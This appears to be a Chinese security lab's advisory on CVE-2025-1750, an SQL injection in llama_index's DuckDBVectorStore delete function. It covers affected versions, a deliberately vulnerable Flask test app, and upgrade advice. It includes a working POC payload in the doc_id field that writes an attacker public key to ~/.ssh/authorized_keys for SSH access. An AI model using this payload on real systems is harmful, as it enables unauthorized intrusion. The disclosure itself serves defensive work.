#  【漏洞预警】llama_index SQL注入漏洞(CVE-2025-1750)   
 源鲁安全实验室   2025-06-04 06:05  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MPS72cibJRUAAtSU29g4u3aKVgnvEM3BIJbTrOeJMeGOibxSV5JUicUc1FpNvGUVh0ISX6wyTDfNM9iakjN1tGJwEw/640?wx_fmt=png&wx_ "")  
  
此文章原创作者为源鲁安全实验室，转载请注明出处！此文章中所涉及的技术、思路和工具仅供网络安全学习为目的，不得以盈利为目的或非法利用，否则后果自行承担！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MPS72cibJRUAAtSU29g4u3aKVgnvEM3BIJbTrOeJMeGOibxSV5JUicUc1FpNvGUVh0ISX6wyTDfNM9iakjN1tGJwEw/640?wx_fmt=png&wx_ "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoDtkqtiaAd2ibGGCjsmJIekhNoqgj5tPRCyyicjibP3axnLfR4TOpALjzTpRVtz9qic69zWyHguNIdAXOA/640?wx_fmt=png&from=appmsg "")  
  
  
**01**  
  
漏洞描  
述  
  
  
      
run-llama/llama_index中DuckDBVectorStore的delete函数存在SQL注入漏洞。该漏洞允许攻击者操纵ref_doc_id参数，从而在服务器上读取和写入任意文件，可能导致远程代码执行 (RCE)。  
  
**02**  
  
**影响版本**  
  
  
llama_index   
< 0.3.1  
  
**03**  
  
**漏洞复现**  
  
  
      
目前，源鲁安全实验室已成功复现  
 llama_index SQL注入漏洞(CVE-2025-1750)，复现过程如下：  
  
1.搭建测试环境  
```
from flask import Flask, request, jsonify, render_template
import os
import numpy as np
from llama_index.vector_stores.duckdb import DuckDBVectorStore
from llama_index.core.schema import TextNode
app = Flask(__name__)
persist_dir = "./persist"
os.makedirs(persist_dir, exist_ok=True)
vector_store = DuckDBVectorStore("chatbot.duckdb", persist_dir=persist_dir,recreate_table=True)
def add_document(doc_id, text, category):
    embedding = np.random.rand(1536).tolist()
    text_node = TextNode(id_=doc_id, text=text, embedding=embedding, metadata={"category": category})
    vector_store.add([text_node])
add_document("doc_1", "Machine learning is amazing!", "AI")
add_document("doc_2", "Deep learning improves natural language processing.", "NLP")
add_document("doc_3", "DuckDB is great for handling large datasets.", "Database")
@app.route('/delete', methods=['POST'])
def ask():

    data = request.get_json()
    doc_id = data.get('doc_id')
    vector_store.delete(ref_doc_id=doc_id)
    return jsonify({'message': "ok"})
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7000)
```  
  
2.安装依赖  
```
pip install flask numpy llama-index-vector-stores-duckdb
```  
  
3.启动测试环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoC2vUNQpapBmj9fGpRhKsQMZdq8FDpYPKgZ5x0QGxC4U0L3icmyV27krcuLrk11icmicPqycY1v3Py7w/640?wx_fmt=png&from=appmsg "")  
  
4.构造漏洞请求  
  
漏洞POC如下：  
```
{"doc_id":"doc1';COPY (SELECT '[publickey]') TO '~/.ssh/authorized_keys';-- -"}
```  
  
修改请求并发包后Burp Suite截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoC2vUNQpapBmj9fGpRhKsQMlkic59qCia6c7eRV2E3nM5N2wGvFciaJcGhrvJK12tRibNfkKSNwic5DzZQ/640?wx_fmt=png&from=appmsg "")  
  
检查 ~/.ssh/authorized_keys 文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoC2vUNQpapBmj9fGpRhKsQMhwibOicnpjPAPOszjibMAATNJT00r0pibzk3jzCdoAdxRYbeiajNFNPEDzQ/640?wx_fmt=png&from=appmsg "")  
  
成功写入公钥，尝试登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoC2vUNQpapBmj9fGpRhKsQMaPqjptB5phdRiaQPmO61t8v1bbyavpu8DQlT0n6Z5TB1WelCfRDmeIA/640?wx_fmt=png&from=appmsg "")  
  
登录成功，至此漏洞复现完成  
  
  
**04**  
  
**修复建议**  
  
  
将llama_index升级至最新版本。  
  
链接：https://github.com/run-llama/llama_index  
  
**05**  
  
**引用**  
  
  
https://huntr.com/bounties/e1302233-9180-4269-9047-1526247d2cd8  
  
https://github.com/run-llama/llama_index/commit/369a2942df2efcf6b74461c45d20a0af1fbe4ae2  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoDtkqtiaAd2ibGGCjsmJIekhNoqgj5tPRCyyicjibP3axnLfR4TOpALjzTpRVtz9qic69zWyHguNIdAXOA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoDtkqtiaAd2ibGGCjsmJIekhNiar3jgUyo7e3ib5ZAjUGj3uqGibLQtcusq85Oy7k3IibpjCVKcx6JjsOww/640?wx_fmt=png&from=appmsg "")  
  
**END**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoDtkqtiaAd2ibGGCjsmJIekhNGia1F0ufcUibviarnJ2oNurofFbLJvuXQ9Z7dosic5w2CelUiaTsWb3BZyg/640?wx_fmt=png&from=appmsg "")  
  
  
  
        1  
  
  
  
  
**关于源鲁安全实验室**  
    
  
源鲁安全实验室是一支以攻防研究为核心的安全团队，团队成员来源于一线攻防团队，安全研究团队。研究方向涉及  
WEB安全  
，APP安全，漏洞研究，代码审计，内网渗透，二进制，安全产品研究等多个领域，致力为客户提供一流的服务，保障客户业务安全。  
  
  
  
  
  
  
  
  
****  
**来都来了，点个赞再走吧~~~**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/BSbU8iceXVoDtkqtiaAd2ibGGCjsmJIekhNZnyYbkP5niaaeP5AyVIRvpwicMtTH0tIPvvIZmfEQKUODb6NnKRJice6w/640?wx_fmt=gif&from=appmsg "")  
  
  
